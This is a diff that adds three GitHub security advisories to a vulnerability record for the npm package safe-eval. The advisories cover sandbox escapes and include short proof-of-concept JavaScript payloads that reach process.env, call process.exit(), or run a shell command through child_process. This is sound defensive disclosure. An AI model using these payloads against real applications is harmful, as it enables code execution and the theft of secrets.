@@ -1,7 +1,59 @@
 {
   "packageName": "safe-eval",
-  "lastUpdated": "2026-03-08T16:40:25.784Z",
+  "lastUpdated": "2026-05-04T13:06:56.926Z",
   "vulnerabilities": [
+    {
+      "id": "GHSA-hrpq-r399-whgw",
+      "packageName": "safe-eval",
+      "title": "Sandbox Breakout / Arbitrary Code Execution in safe-eval",
+      "description": "All versions of `safe-eval` are vulnerable to Sandbox Escape leading to Remote Code Execution. The package fails to restrict access to the main context through Error objects. This may allow attackers to execute arbitrary code in the system. \n\nEvaluating the payload \n```js\n(function (){\n  var ex = new Error\n  ex.__proto__ = null\n  ex.stack = {\n    match: x => {\n      return x.constructor.constructor(\"throw process.env\")()\n    }\n  }\n  return ex\n})()\n``` \n\nprints the contents of `process.env`.\n\n\n##",
+      "severity": "critical",
+      "url": "https://github.com/advisories/GHSA-hrpq-r399-whgw",
+      "publishedAt": "2020-08-25T23:40:53Z",
+      "modifiedAt": "2023-09-11T23:01:26Z",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-hrpq-r399-whgw"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2020-7710"
+        }
+      ],
+      "affectedVersions": [
+        {
+          "range": "<= 0.4.1"
+        }
+      ],
+      "source": "github"
+    },
+    {
+      "id": "GHSA-ww6v-677g-p656",
+      "packageName": "safe-eval",
+      "title": "Sandbox Breakout in safe-eval",
+      "description": "Affected versions of `safe-eval` are vulnerable to a sandbox escape. By accessing object constructors, un-sanitized user input can access the entire standard library and effectively break out of the sandbox. \n\n## Proof of Concept:\nThis code accesses the process object and calls `.exit()`\n```js\nvar safeEval = require('safe-eval');\nsafeEval(\"this.constructor.constructor('return process')().exit()\");\n```\n\n\n## Recommendation\n\nUpdate to version 0.4.0 or later",
+      "severity": "critical",
+      "url": "https://github.com/advisories/GHSA-ww6v-677g-p656",
+      "publishedAt": "2018-07-18T18:28:10Z",
+      "modifiedAt": "2023-09-11T22:19:20Z",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-ww6v-677g-p656"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2017-16088"
+        }
+      ],
+      "affectedVersions": [
+        {
+          "range": "<= 0.3.0"
+        }
+      ],
+      "source": "github"
+    },
     {
       "id": "GHSA-79xf-67r4-q2jj",
       "packageName": "safe-eval",
@@ -76,6 +128,28 @@
       "affectedVersions": [
         {
           "range": "<= 0.4.1"
+        }
+      ],
+      "source": "github"
+    },
+    {
+      "id": "GHSA-9pcf-h8q9-63f6",
+      "packageName": "safe-eval",
+      "title": "Sandbox Breakout / Arbitrary Code Execution in safe-eval",
+      "description": "All versions of `safe-eval` are vulnerable to Sandbox Escape leading to Remote Code Execution. A payload chaining a function's callee and caller constructors can escape the sandbox and execute arbitrary code.  \n\nFor example, the payload \n```\n((() => { \nconst targetKey = Object.keys(this)[0]; \nObject.defineProperty(this, targetKey, { \nget: function() { \nreturn arguments.callee.caller.constructor( \n\"return global.process.mainModule.require('child_process').execSync('pwd').toString()\" \n)(); \n} \n});",
+      "severity": "high",
+      "url": "https://github.com/advisories/GHSA-9pcf-h8q9-63f6",
+      "publishedAt": "2020-09-03T17:12:41Z",
+      "modifiedAt": "2023-01-09T05:04:08Z",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-9pcf-h8q9-63f6"
+        }
+      ],
+      "affectedVersions": [
+        {
+          "range": ">= 0.0.0"
         }
       ],
       "source": "github"
